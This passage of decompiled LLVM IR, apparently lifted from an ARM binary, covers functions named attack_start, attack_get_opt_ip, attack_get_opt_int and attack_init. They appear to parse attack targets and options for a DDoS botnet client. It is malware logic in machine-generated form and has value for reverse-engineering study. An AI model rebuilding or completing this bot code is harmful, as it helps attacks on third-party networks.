  store i32 %v1_8394, i32* %r3.global-to-local, align 4
  %v3_8398 = icmp ult i32 %v1_8394, %v2_8390
  %v9_8398 = icmp eq i32 %v1_8394, %v2_8390
  store i1 %v9_8398, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_8398, label %dec_label_pc_8340, label %dec_label_pc_83a0

dec_label_pc_83a0:                                ; preds = %dec_label_pc_838c
  store i32 %v4_8380, i32* %r0.global-to-local, align 4
  store i32 24, i32* %r1.global-to-local, align 4
  store i32 %v1_8394, i32* @r6, align 4
  %v2_83ac = call i32 @calloc(i32 %v4_8380, i32 24)
  store i32 %v2_83ac, i32* %ip.global-to-local, align 4
  %v0_83b8 = load i32, i32* @r7, align 4
  %v1_83b8 = load i32, i32* @r4, align 4
  %v2_83b8 = sub i32 %v1_83b8, %v0_83b8
  store i32 %v2_83b8, i32* @r7, align 4
  %v0_83bc = load i32, i32* @r5, align 4
  %v1_83bc = add i32 %v0_83bc, 11
  store i32 %v1_83bc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_83c0

dec_label_pc_83c0:                                ; preds = %dec_label_pc_83c0, %dec_label_pc_83a0
  %v1_83c4 = phi i32 [ %v1_83f0, %dec_label_pc_83c0 ], [ %v2_83ac, %dec_label_pc_83a0 ]
  %v0_83c0 = phi i32 [ %v1_83ec, %dec_label_pc_83c0 ], [ %v1_83bc, %dec_label_pc_83a0 ]
  %v1_83c0 = add i32 %v0_83c0, -5
  %v2_83c0 = inttoptr i32 %v1_83c0 to i32*
  %v3_83c0 = load i32, i32* %v2_83c0, align 4
  store i32 %v3_83c0, i32* %r1.global-to-local, align 4
  %v2_83c4 = add i32 %v1_83c4, 16
  %v3_83c4 = inttoptr i32 %v2_83c4 to i32*
  store i32 %v3_83c0, i32* %v3_83c4, align 4
  %v0_83c8 = load i32, i32* @r7, align 4
  %v1_83c8 = add i32 %v0_83c8, -6
  store i32 %v1_83c8, i32* %r3.global-to-local, align 4
  %v0_83cc = load i32, i32* %r0.global-to-local, align 4
  %v1_83cc = add i32 %v0_83cc, -1
  %v2_83cc = inttoptr i32 %v1_83cc to i8*
  %v3_83cc = load i8, i8* %v2_83cc, align 1
  %v4_83cc = zext i8 %v3_83cc to i32
  store i32 %v4_83cc, i32* %r2.global-to-local, align 4
  %v0_83d0 = load i32, i32* @r6, align 4
  %v1_83d0 = add i32 %v0_83d0, -5
  store i32 %v1_83d0, i32* @r6, align 4
  %v9_83d4 = icmp eq i32 %v1_83d0, %v1_83c8
  store i1 %v9_83d4, i1* %cpsr_z.global-to-local, align 1
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 %v0_83cc, i32* @r4, align 4
  %v2_83e0 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e0 = add i32 %v2_83e0, 20
  %v4_83e0 = inttoptr i32 %v3_83e0 to i8*
  store i8 %v3_83cc, i8* %v4_83e0, align 1
  %v0_83e4 = load i32, i32* %r1.global-to-local, align 4
  %v1_83e4 = load i32, i32* %ip.global-to-local, align 4
  %v2_83e4 = add i32 %v1_83e4, 4
  %v3_83e4 = inttoptr i32 %v2_83e4 to i32*
  store i32 %v0_83e4, i32* %v3_83e4, align 4
  %v0_83e8 = load i32, i32* %r3.global-to-local, align 4
  %v1_83e8 = trunc i32 %v0_83e8 to i16
  %v2_83e8 = load i32, i32* %ip.global-to-local, align 4
  %v3_83e8 = inttoptr i32 %v2_83e8 to i16*
  store i16 %v1_83e8, i16* %v3_83e8, align 2
  %v0_83ec = load i32, i32* %r0.global-to-local, align 4
  %v1_83ec = add i32 %v0_83ec, 5
  store i32 %v1_83ec, i32* %r0.global-to-local, align 4
  %v0_83f0 = load i32, i32* %ip.global-to-local, align 4
  %v1_83f0 = add i32 %v0_83f0, 24
  store i32 %v1_83f0, i32* %ip.global-to-local, align 4
  %v0_83f4 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_83f4, label %dec_label_pc_83f8, label %dec_label_pc_83c0

dec_label_pc_83f8:                                ; preds = %dec_label_pc_83c0
  %v0_83f8 = load i32, i32* @r6, align 4
  %v2_83f8 = icmp eq i32 %v0_83f8, 0
  store i1 %v2_83f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_83f8, label %dec_label_pc_84fc, label %dec_label_pc_8400

dec_label_pc_8400:                                ; preds = %dec_label_pc_83f8
  %v0_8400 = load i32, i32* @r4, align 4
  %v1_8400 = inttoptr i32 %v0_8400 to i8*
  %v2_8400 = load i8, i8* %v1_8400, align 1
  %v3_8400 = zext i8 %v2_8400 to i32
  store i32 %v3_8400, i32* @r5, align 4
  %v2_8404 = icmp eq i8 %v2_8400, 0
  store i1 %v2_8404, i1* %cpsr_z.global-to-local, align 1
  %v0_8408 = load i32, i32* @r7, align 4
  %v1_8408 = add i32 %v0_8408, -7
  store i32 %v1_8408, i32* @r8, align 4
  br i1 %v2_8404, label %bb, label %dec_label_pc_8414

bb:                                               ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* @r6, align 4
  br label %dec_label_pc_84d8

dec_label_pc_8414:                                ; preds = %dec_label_pc_8400
  store i32 %v3_8400, i32* %r0.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_841c = call i32 @calloc(i32 %v3_8400, i32 8)
  store i32 %v2_841c, i32* %r0.global-to-local, align 4
  %v0_8420 = load i32, i32* @r8, align 4
  %v2_8420 = icmp eq i32 %v0_8420, 0
  store i1 %v2_8420, i1* %cpsr_z.global-to-local, align 1
  store i32 %v2_841c, i32* @r6, align 4
  br i1 %v2_8420, label %dec_label_pc_84fc, label %dec_label_pc_842c

dec_label_pc_842c:                                ; preds = %dec_label_pc_8414
  %v0_842c = load i32, i32* @r4, align 4
  %v1_842c = add i32 %v0_842c, 1
  %v2_842c = inttoptr i32 %v1_842c to i8*
  %v3_842c = load i8, i8* %v2_842c, align 1
  %v0_8430 = load i32, i32* @r7, align 4
  %v7_8430 = icmp eq i32 %v0_8430, 8
  store i1 %v7_8430, i1* %cpsr_z.global-to-local, align 1
  %v3_8434 = add i32 %v2_841c, 4
  %v4_8434 = inttoptr i32 %v3_8434 to i8*
  store i8 %v3_842c, i8* %v4_8434, align 1
  %v0_8438 = load i32, i32* @r4, align 4
  %v1_8438 = add i32 %v0_8438, 1
  store i32 %v1_8438, i32* %r3.global-to-local, align 4
  %v0_843c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_843c, label %dec_label_pc_84fc, label %dec_label_pc_8440

dec_label_pc_8440:                                ; preds = %dec_label_pc_842c
  %v1_8440 = add i32 %v0_8438, 2
  %v2_8440 = inttoptr i32 %v1_8440 to i8*
  %v3_8440 = load i8, i8* %v2_8440, align 1
  %v4_8440 = zext i8 %v3_8440 to i32
  store i32 %v4_8440, i32* @r4, align 4
  %v0_8444 = load i32, i32* @r7, align 4
  %v1_8444 = add i32 %v0_8444, -9
  store i32 %v1_8444, i32* @r8, align 4
  %v9_8448 = icmp eq i32 %v1_8444, %v4_8440
  store i1 %v9_8448, i1* %cpsr_z.global-to-local, align 1
  store i32 %v1_8440, i32* %r1.global-to-local, align 4
  %v5_8450 = icmp slt i32 %v1_8444, %v4_8440
  br i1 %v5_8450, label %dec_label_pc_84fc, label %bb35

bb35:                                             ; preds = %dec_label_pc_8440
  store i32 0, i32* %r2.global-to-local, align 4
  %v7_84547 = add i32 %v0_8438, 3
  store i32 %v7_84547, i32* @r7, align 4
  %v6_8458 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v6_8458, i32* @sl, align 4
  br label %dec_label_pc_849c

dec_label_pc_8468:                                ; preds = %dec_label_pc_849c
  %v0_8468 = load i32, i32* @r8, align 4
  %v1_8468 = load i32, i32* @r4, align 4
  %v2_8468 = sub i32 %v0_8468, %v1_8468
  store i32 %v2_8468, i32* %r2.global-to-local, align 4
  %v9_8468 = icmp eq i32 %v0_8468, %v1_8468
  store i1 %v9_8468, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_8468, label %dec_label_pc_84fc, label %dec_label_pc_8470

dec_label_pc_8470:                                ; preds = %dec_label_pc_8468
  %v1_8470 = load i32, i32* @r7, align 4
  %v2_8470 = add i32 %v1_8470, %v1_8468
  %v3_8470 = inttoptr i32 %v2_8470 to i8*
  %v4_8470 = load i8, i8* %v3_8470, align 1
  store i32 %v2_8470, i32* %r0.global-to-local, align 4
  %v1_8478 = add i32 %v2_8468, -1
  store i32 %v1_8478, i32* %r2.global-to-local, align 4
  %v7_8478 = icmp eq i32 %v2_8468, 1
  store i1 %v7_8478, i1* %cpsr_z.global-to-local, align 1
  %v3_847c = add i32 %v2_84d0, 4
  %v4_847c = inttoptr i32 %v3_847c to i8*
  store i8 %v4_8470, i8* %v4_847c, align 1
  %v0_8480 = load i32, i32* %r0.global-to-local, align 4
  %v1_8480 = add i32 %v0_8480, 1
  store i32 %v1_8480, i32* %r3.global-to-local, align 4
  %v0_8484 = load i32, i32* %r2.global-to-local, align 4
  %v1_8484 = add i32 %v0_8484, -1
  store i32 %v1_8484, i32* @r8, align 4
  %v1_8488 = add i32 %v0_8480, 2
  store i32 %v1_8488, i32* @r7, align 4
  %v0_848c = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_848c, label %dec_label_pc_84fc, label %dec_label_pc_8490

dec_label_pc_8490:                                ; preds = %dec_label_pc_8470
  %v2_8490 = inttoptr i32 %v1_8480 to i8*
  %v3_8490 = load i8, i8* %v2_8490, align 1
  %v4_8490 = zext i8 %v3_8490 to i32
  store i32 %v4_8490, i32* @r4, align 4
  %v2_8494 = sub i32 %v1_8484, %v4_8490
  %tmp36 = sub i32 0, %v2_8494
  %v6_8494 = and i32 %v1_8484, %tmp36
  %v7_8494 = icmp slt i32 %v6_8494, 0
  %v8_8494 = icmp slt i32 %v2_8494, 0
  %v9_8494 = icmp eq i32 %v1_8484, %v4_8490
  store i1 %v9_8494, i1* %cpsr_z.global-to-local, align 1
  %v2_8498 = xor i1 %v8_8494, %v7_8494
  br i1 %v2_8498, label %dec_label_pc_84fc, label %dec_label_pc_849c

dec_label_pc_849c:                                ; preds = %bb35, %dec_label_pc_8490
  %v0_84a0 = phi i32 [ %v4_8440, %bb35 ], [ %v4_8490, %dec_label_pc_8490 ]
  %stack_var_-48.1 = phi i32 [ 0, %bb35 ], [ %v1_84b0, %dec_label_pc_8490 ]
  store i32 1, i32* %r1.global-to-local, align 4
  %v1_84a0 = add nuw nsw i32 %v0_84a0, 1
  store i32 %v1_84a0, i32* %r0.global-to-local, align 4
  %v2_84a4 = call i32 @calloc(i32 %v1_84a0, i32 1)
  store i32 %v2_84a4, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-48.1, i32* %r3.global-to-local, align 4
  %v1_84ac = load i32, i32* @sl, align 4
  %v2_84ac = inttoptr i32 %v1_84ac to i32*
  store i32 %v2_84a4, i32* %v2_84ac, align 4
  %v0_84b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_84b0 = add i32 %v0_84b0, 1
  store i32 %v1_84b0, i32* %r3.global-to-local, align 4
  %v0_84b4 = load i32, i32* @r4, align 4
  store i32 %v0_84b4, i32* %r2.global-to-local, align 4
  %v0_84b8 = load i32, i32* @r7, align 4
  store i32 %v0_84b8, i32* %r1.global-to-local, align 4
  %v3_84c0 = call i32 @util_memcpy(i32 %v2_84a4, i32 %v0_84b8, i32 %v0_84b4)
  store i32 %v3_84c0, i32* %r0.global-to-local, align 4
  store i32 %v1_84b0, i32* %r2.global-to-local, align 4
  %v3_84c8 = mul i32 %v1_84b0, 8
  store i32 %v3_84c8, i32* %r3.global-to-local, align 4
  %v1_84cc = load i32, i32* @r5, align 4
  %v9_84cc = icmp eq i32 %v1_84b0, %v1_84cc
  store i1 %v9_84cc, i1* %cpsr_z.global-to-local, align 1
  %v0_84d0 = load i32, i32* @r6, align 4
  %v2_84d0 = add i32 %v0_84d0, %v3_84c8
  store i32 %v2_84d0, i32* @sl, align 4
  br i1 %v9_84cc, label %dec_label_pc_84d8, label %dec_label_pc_8468

dec_label_pc_84d8:                                ; preds = %dec_label_pc_849c, %bb
  %v0_84d8 = call i32 @__GI___errno_location()
  %v2_84e0 = inttoptr i32 %v0_84d8 to i32*
  store i32 0, i32* %v2_84e0, align 4
  store i32 %v4_8370, i32* %r1.global-to-local, align 4
  %v0_84e8 = load i32, i32* @fp, align 4
  store i32 %v0_84e8, i32* %r0.global-to-local, align 4
  %v0_84ec = load i32, i32* @sb, align 4
  store i32 %v0_84ec, i32* %r2.global-to-local, align 4
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_84f4 = load i32, i32* @r5, align 4
  %v5_84f4 = load i32, i32* @r6, align 4
  %v6_84f8 = trunc i32 %v2_84f4 to i8
  %v7_84f8 = call i32 @attack_start(i32 %v0_84e8, i32 %v4_8370, i32 %v0_84ec, i32 %v2_83ac, i8 %v6_84f8, i32 %v5_84f4)
  store i32 %v7_84f8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_84fc

dec_label_pc_84fc:                                ; preds = %dec_label_pc_8490, %dec_label_pc_8470, %dec_label_pc_8468, %dec_label_pc_8440, %dec_label_pc_842c, %dec_label_pc_8414, %dec_label_pc_83f8, %dec_label_pc_84d8
  store i32 %v2_83ac, i32* %r3.global-to-local, align 4
  %v2_8500 = icmp eq i32 %v2_83ac, 0
  store i1 %v2_8500, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8500, label %bb38, label %bb37

bb37:                                             ; preds = %dec_label_pc_84fc
  store i32 %v2_83ac, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %dec_label_pc_84fc, %bb37
  store i32 34060, i32* @lr, align 4
  %v1_8508 = xor i1 %v2_8500, true
  call void @__pseudo_cond_branch(i1 %v1_8508, i32 ptrtoint (i32* @global_var_135cc.33 to i32))
  %v0_850c = load i32, i32* @r6, align 4
  %v2_850c = icmp eq i32 %v0_850c, 0
  store i1 %v2_850c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_850c, label %.dec_label_pc_8340_crit_edge, label %dec_label_pc_8514

.dec_label_pc_8340_crit_edge:                     ; preds = %bb38
  %v1_8348.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

dec_label_pc_8514:                                ; preds = %bb38
  %v0_8514 = load i32, i32* @r5, align 4
  %v2_8514 = icmp eq i32 %v0_8514, 0
  store i1 %v2_8514, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_8514, label %dec_label_pc_8538, label %dec_label_pc_851c

dec_label_pc_851c:                                ; preds = %dec_label_pc_8514
  br label %dec_label_pc_8520

dec_label_pc_8520:                                ; preds = %dec_label_pc_8520, %dec_label_pc_851c
  %v0_8528 = phi i32 [ 0, %dec_label_pc_851c ], [ %v1_8530, %dec_label_pc_8520 ]
  %v0_8520 = phi i32 [ %v0_850c, %dec_label_pc_851c ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  %v4_8520 = mul i32 %v0_8528, 8
  %v5_8520 = add i32 %v4_8520, %v0_8520
  %v6_8520 = inttoptr i32 %v5_8520 to i32*
  %v7_8520 = load i32, i32* %v6_8520, align 4
  store i32 %v7_8520, i32* %r0.global-to-local, align 4
  %v2_8524 = icmp eq i32 %v7_8520, 0
  store i1 %v2_8524, i1* %cpsr_z.global-to-local, align 1
  %v1_8528 = add i32 %v0_8528, 1
  store i32 %v1_8528, i32* @r4, align 4
  store i32 34096, i32* @lr, align 4
  %v1_852c = xor i1 %v2_8524, true
  call void @__pseudo_cond_branch(i1 %v1_852c, i32 ptrtoint (i32* @global_var_135cc.33 to i32))
  %v0_8530 = load i32, i32* @r5, align 4
  %v1_8530 = load i32, i32* @r4, align 4
  %v9_8530 = icmp eq i32 %v0_8530, %v1_8530
  store i1 %v9_8530, i1* %cpsr_z.global-to-local, align 1
  %v0_8538.pre = load i32, i32* @r6, align 4
  br i1 %v9_8530, label %dec_label_pc_8538, label %dec_label_pc_8520

dec_label_pc_8538:                                ; preds = %dec_label_pc_8520, %dec_label_pc_8514
  %v0_8538 = phi i32 [ %v0_850c, %dec_label_pc_8514 ], [ %v0_8538.pre, %dec_label_pc_8520 ]
  store i32 %v0_8538, i32* @r0, align 4
  %v0_853c = call i32 @free()
  store i32 %v0_853c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_8340

; uselistorder directives
  uselistorder i32 %v0_853c, { 1, 0 }
  uselistorder i32 %v1_8530, { 1, 0 }
  uselistorder i1 %v2_8500, { 0, 2, 1 }
  uselistorder i32 %v2_84d0, { 1, 0 }
  uselistorder i32 %v3_84c8, { 1, 0 }
  uselistorder i32 %v1_84b0, { 3, 0, 2, 4, 1 }
  uselistorder i32 %v2_8494, { 1, 0 }
  uselistorder i32 %v4_8490, { 0, 2, 1, 3 }
  uselistorder i32 %v1_8484, { 2, 0, 1, 3 }
  uselistorder i32 %v3_8400, { 1, 0, 2, 3 }
  uselistorder i32 %v1_83f0, { 1, 0 }
  uselistorder i32 %v1_83ec, { 1, 0 }
  uselistorder i32 %v2_83ac, { 0, 4, 5, 2, 3, 1, 6 }
  uselistorder i32 %v4_8380, { 1, 0, 2, 3 }
  uselistorder i32 %v1_8350, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v2_834c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_8338, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 3, 4, 5, 6, 2, 7, 8, 9, 10, 11, 12 }
  uselistorder i32* %r2.global-to-local, { 1, 5, 6, 2, 3, 4, 0, 7, 8, 9 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i32* %r0.global-to-local, { 4, 2, 17, 3, 6, 5, 9, 11, 10, 7, 8, 18, 19, 12, 13, 14, 15, 16, 20, 21, 0, 1 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 1, 2, 3, 4, 9, 5, 6, 7, 8, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder label %bb38, { 1, 0 }
  uselistorder label %dec_label_pc_84fc, { 7, 0, 1, 2, 3, 4, 5, 6 }
  uselistorder label %dec_label_pc_849c, { 1, 0 }
  uselistorder label %dec_label_pc_8340, { 6, 1, 0, 2, 3, 4, 5 }
}

define i32 @attack_get_opt_ip(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_8544 = icmp eq i32 %arg1, 0
  %v3_8548 = load i32, i32* @r4, align 4
  store i32 %v3_8548, i32* %stack_var_-8, align 4
  %v6_8548 = load i32, i32* @lr, align 4
  store i32 %arg4, i32* @r4, align 4
  br i1 %v2_8544, label %dec_label_pc_858c, label %dec_label_pc_8554

dec_label_pc_8554:                                ; preds = %entry
  %v0_8554 = load i32, i32* %r1.global-to-local, align 4
  %v1_8554 = add i32 %v0_8554, 4
  %v2_8554 = inttoptr i32 %v1_8554 to i8*
  %v3_8554 = load i8, i8* %v2_8554, align 1
  %v4_8554 = zext i8 %v3_8554 to i32
  %v9_8558 = icmp eq i32 %v4_8554, %arg3
  br i1 %v9_8558, label %dec_label_pc_8598, label %dec_label_pc_857c.preheader

dec_label_pc_857c.preheader:                      ; preds = %dec_label_pc_8554
  br label %dec_label_pc_857c

dec_label_pc_856c:                                ; preds = %dec_label_pc_857c
  %v1_856c = add i32 %v0_8574.in, 12
  %v2_856c = inttoptr i32 %v1_856c to i8*
  %v3_856c = load i8, i8* %v2_856c, align 1
  %v4_856c = zext i8 %v3_856c to i32
  %v9_8570 = icmp eq i32 %v4_856c, %arg3
  br i1 %v9_8570, label %dec_label_pc_8598, label %dec_label_pc_857c

dec_label_pc_857c:                                ; preds = %dec_label_pc_857c.preheader, %dec_label_pc_856c
  %v0_8574.in = phi i32 [ %v0_8554, %dec_label_pc_857c.preheader ], [ %v0_8574, %dec_label_pc_856c ]
  %v0_857c = phi i32 [ 0, %dec_label_pc_857c.preheader ], [ %v1_857c, %dec_label_pc_856c ]
  %v0_8574 = add i32 %v0_8574.in, 8
  %v1_857c = add i32 %v0_857c, 1
  %v9_8580 = icmp eq i32 %v1_857c, %arg1
  store i32 %v0_8574, i32* %r1.global-to-local, align 4
  br i1 %v9_8580, label %dec_label_pc_858c, label %dec_label_pc_856c

dec_label_pc_858c:                                ; preds = %dec_label_pc_857c, %dec_label_pc_8598, %entry, %dec_label_pc_85a4
  %v2_8590 = phi i32 [ %v3_8548, %dec_label_pc_8598 ], [ %v3_8548, %entry ], [ %v2_8590.pre, %dec_label_pc_85a4 ], [ %v3_8548, %dec_label_pc_857c ]
  %v0_858c = phi i32 [ %arg4, %dec_label_pc_8598 ], [ %arg4, %entry ], [ %v1_85a4, %dec_label_pc_85a4 ], [ %arg4, %dec_label_pc_857c ]
  store i32 %v2_8590, i32* @r4, align 4
  store i32 %v6_8548, i32* @lr, align 4
  ret i32 %v0_858c

dec_label_pc_8598:                                ; preds = %dec_label_pc_856c, %dec_label_pc_8554
  %v0_8598 = phi i32 [ %v0_8554, %dec_label_pc_8554 ], [ %v0_8574, %dec_label_pc_856c ]
  %v1_8598 = inttoptr i32 %v0_8598 to i32*
  %v2_8598 = load i32, i32* %v1_8598, align 4
  store i32 %v2_8598, i32* @r0, align 4
  %v2_859c = icmp eq i32 %v2_8598, 0
  br i1 %v2_859c, label %dec_label_pc_858c, label %dec_label_pc_85a4

dec_label_pc_85a4:                                ; preds = %dec_label_pc_8598
  %v1_85a4 = call i32 @inet_addr(i32 %v2_8598)
  %v2_8590.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_858c

; uselistorder directives
  uselistorder i32 %v1_857c, { 1, 0 }
  uselistorder i32 %v0_8574, { 1, 0, 2 }
  uselistorder i32 %v0_8574.in, { 1, 0 }
  uselistorder i32 %v0_8554, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 0, 1 }
  uselistorder label %dec_label_pc_858c, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_857c, { 1, 0 }
}

define i32 @attack_get_opt_int(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v2_85b0 = icmp eq i32 %arg1, 0
  %v3_85b4 = load i32, i32* @r4, align 4
  store i32 %v3_85b4, i32* %stack_var_-8, align 4
  %v6_85b4 = load i32, i32* @lr, align 4
  br i1 %v2_85b0, label %dec_label_pc_85f8, label %dec_label_pc_85c0

dec_label_pc_85c0:                                ; preds = %entry
  %v0_85c0 = load i32, i32* %r1.global-to-local, align 4
  %v1_85c0 = add i32 %v0_85c0, 4
  %v2_85c0 = inttoptr i32 %v1_85c0 to i8*
  %v3_85c0 = load i8, i8* %v2_85c0, align 1
  %v4_85c0 = zext i8 %v3_85c0 to i32
  %v9_85c4 = icmp eq i32 %v4_85c0, %arg3
  br i1 %v9_85c4, label %dec_label_pc_8604, label %dec_label_pc_85e8.preheader

dec_label_pc_85e8.preheader:                      ; preds = %dec_label_pc_85c0
  br label %dec_label_pc_85e8

dec_label_pc_85d8:                                ; preds = %dec_label_pc_85e8
  %v1_85d8 = add i32 %v0_85e0.in, 12
  %v2_85d8 = inttoptr i32 %v1_85d8 to i8*
  %v3_85d8 = load i8, i8* %v2_85d8, align 1
  %v4_85d8 = zext i8 %v3_85d8 to i32
  %v9_85dc = icmp eq i32 %v4_85d8, %arg3
  br i1 %v9_85dc, label %dec_label_pc_8604, label %dec_label_pc_85e8

dec_label_pc_85e8:                                ; preds = %dec_label_pc_85e8.preheader, %dec_label_pc_85d8
  %v0_85e0.in = phi i32 [ %v0_85c0, %dec_label_pc_85e8.preheader ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v0_85e8 = phi i32 [ 0, %dec_label_pc_85e8.preheader ], [ %v1_85e8, %dec_label_pc_85d8 ]
  %v0_85e0 = add i32 %v0_85e0.in, 8
  %v1_85e8 = add i32 %v0_85e8, 1
  %v9_85ec = icmp eq i32 %v1_85e8, %arg1
  store i32 %v0_85e0, i32* %r1.global-to-local, align 4
  br i1 %v9_85ec, label %dec_label_pc_85f8, label %dec_label_pc_85d8

dec_label_pc_85f8:                                ; preds = %dec_label_pc_85e8, %dec_label_pc_8604, %entry, %dec_label_pc_8610
  %v2_85fc = phi i32 [ %v3_85b4, %dec_label_pc_8604 ], [ %v3_85b4, %entry ], [ %v2_85fc.pre, %dec_label_pc_8610 ], [ %v3_85b4, %dec_label_pc_85e8 ]
  %v0_85f8 = phi i32 [ %arg4, %dec_label_pc_8604 ], [ %arg4, %entry ], [ %v3_8614, %dec_label_pc_8610 ], [ %arg4, %dec_label_pc_85e8 ]
  store i32 %v2_85fc, i32* @r4, align 4
  store i32 %v6_85b4, i32* @lr, align 4
  ret i32 %v0_85f8

dec_label_pc_8604:                                ; preds = %dec_label_pc_85d8, %dec_label_pc_85c0
  %v0_8604 = phi i32 [ %v0_85c0, %dec_label_pc_85c0 ], [ %v0_85e0, %dec_label_pc_85d8 ]
  %v1_8604 = inttoptr i32 %v0_8604 to i32*
  %v2_8604 = load i32, i32* %v1_8604, align 4
  %v2_8608 = icmp eq i32 %v2_8604, 0
  br i1 %v2_8608, label %dec_label_pc_85f8, label %dec_label_pc_8610

dec_label_pc_8610:                                ; preds = %dec_label_pc_8604
  store i32 10, i32* %r1.global-to-local, align 4
  %v2_8614 = inttoptr i32 %v2_8604 to i8*
  %v3_8614 = call i32 @util_atoi(i8* %v2_8614, i32 10)
  %v2_85fc.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_85f8

; uselistorder directives
  uselistorder i32 %v1_85e8, { 1, 0 }
  uselistorder i32 %v0_85e0, { 1, 0, 2 }
  uselistorder i32 %v0_85e0.in, { 1, 0 }
  uselistorder i32 %v0_85c0, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_85f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_85e8, { 1, 0 }
}

define i32 @attack_init(i32 %arg1) local_unnamed_addr {
entry:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_8620 = load i32, i32* @r4, align 4
  store i32 %v3_8620, i32* %stack_var_-24, align 4
  %v6_8620 = load i32, i32* @r5, align 4
  %v9_8620 = load i32, i32* @r6, align 4
  %v12_8620 = load i32, i32* @r7, align 4
  %v15_8620 = load i32, i32* @r8, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  %v2_862c = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i8** @global_var_22460.29 to i32), i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_22464.31 to i32), i32* @r6, align 4
  store i32 47272, i32* %r2.global-to-local, align 4
  store i32 %v2_862c, i32* @r5, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22461.37 to i32), i32* %r1.global-to-local, align 4
  %v2_864c = load i32, i32* @global_var_22464.31, align 4
  %v2_8650 = inttoptr i32 %v2_862c to i32*
  store i32 47272, i32* %v2_8650, align 4
  %v3_8654 = load i32, i32* @r5, align 4
  %v4_8654 = add i32 %v3_8654, 4
  %v5_8654 = inttoptr i32 %v4_8654 to i8*
  store i8 0, i8* %v5_8654, align 1
  %v0_8658 = load i32, i32* %r1.global-to-local, align 4
  %v3_8658 = mul i32 %v0_8658, 4
  store i32 %v3_8658, i32* %r1.global-to-local, align 4
  %v5_865c = inttoptr i32 %v2_864c to i32*
  %v6_865c = call i32 @realloc(i32* %v5_865c, i32 %v3_8658, i32 47272, i32 0)
  %v2_8660 = load i8, i8* bitcast (i8** @global_var_22460.29 to i8*), align 4
  %v3_8660 = zext i8 %v2_8660 to i32
  store i32 %v6_865c, i32* %r2.global-to-local, align 4
  %v0_8668 = load i32, i32* @r5, align 4
  %v5_8668 = mul nuw nsw i32 %v3_8660, 4
  %v6_8668 = add i32 %v5_8668, %v6_865c
  %v7_8668 = inttoptr i32 %v6_8668 to i32*
  store i32 %v0_8668, i32* %v7_8668, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 ptrtoint (i8* @global_var_22461.37 to i32), i32* %r3.global-to-local, align 4
  %v1_8678 = load i32, i32* @r6, align 4
  %v2_8678 = inttoptr i32 %v1_8678 to i32*
  store i32 %v6_865c, i32* %v2_8678, align 4
  %v0_867c = load i32, i32* %r3.global-to-local, align 4
  %v1_867c = trunc i32 %v0_867c to i8
  %v2_867c = load i32, i32* @r4, align 4
  %v3_867c = inttoptr i32 %v2_867c to i8*
  store i8 %v1_867c, i8* %v3_867c, align 1
  %v2_8680 = call i32 @calloc(i32 1, i32 8)
  store i32 ptrtoint (i32* @global_var_bd94.39 to i32), i32* %r3.global-to-local, align 4
  store i32 1, i32* @r8, align 4
  store i32 %v2_8680, i32* @r5, align 4
  store i32 ptrtoint (i8* @global_var_22461.37 to i32), i32* %r1.global-to-local, align 4
  %v2_8698 = load i32, i32* @global_var_22464.31, align 4
  %v2_869c = inttoptr i32 %v2_8680 to i32*
  store i32 ptrtoint (i32* @global_var_bd94.39 to i32), i32* %v2_869c, align 4
  %v0_86a0 = load i32, i32* @r8, align 4
